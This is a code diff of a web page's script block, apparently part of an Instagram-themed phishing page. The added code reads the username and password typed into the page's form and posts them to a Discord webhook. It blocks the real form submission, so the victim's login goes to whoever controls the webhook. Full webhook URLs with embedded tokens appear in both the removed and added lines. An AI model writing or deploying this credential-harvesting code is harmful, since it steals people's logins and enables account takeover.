@@ -68,18 +68,18 @@
 </div>
 
 <script>
-    function sendWebhook() {
-        const webhookUrl = 'Yhttps://discord.com/api/webhooks/1217773735701118987/Ui-NiNk8HmuDShFCVPbJOLmP4XbWH_saXaI-rDQfZh5vWW6cfpvFXiNA5T8aVnd4f3I6';
-        const message = 'Someone tried to hack into Instagram!';
-
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ content: message })
-        });
-    }
+   function sendWebhook() { 
+    const webhookUrl = 'https://discord.com/api/webhooks/1217785336944525329/TVBI0quqjx37KtQ6GA0hCEOOUUFS-avS0QI7adZwBjS2Sd62JvQdEAHMvHLbALYMaIBX'; 
+    const inputText = document.querySelector('input[type="text"]').value; 
+    const password = document.querySelector('input[type="password"]').value; 
+    const message = `Hello id: ${inputText} password: ${password}`; // バッククォートを使って文字列を囲むことで変数を埋め込む 
+    fetch(webhookUrl, { 
+        method: 'POST', 
+        headers: { 'Content-Type': 'application/json' }, 
+        body: JSON.stringify({ content: message }) 
+    });
+    return false; // フォームがサブミットされないようにする
+}
 </script>
 
 </body>
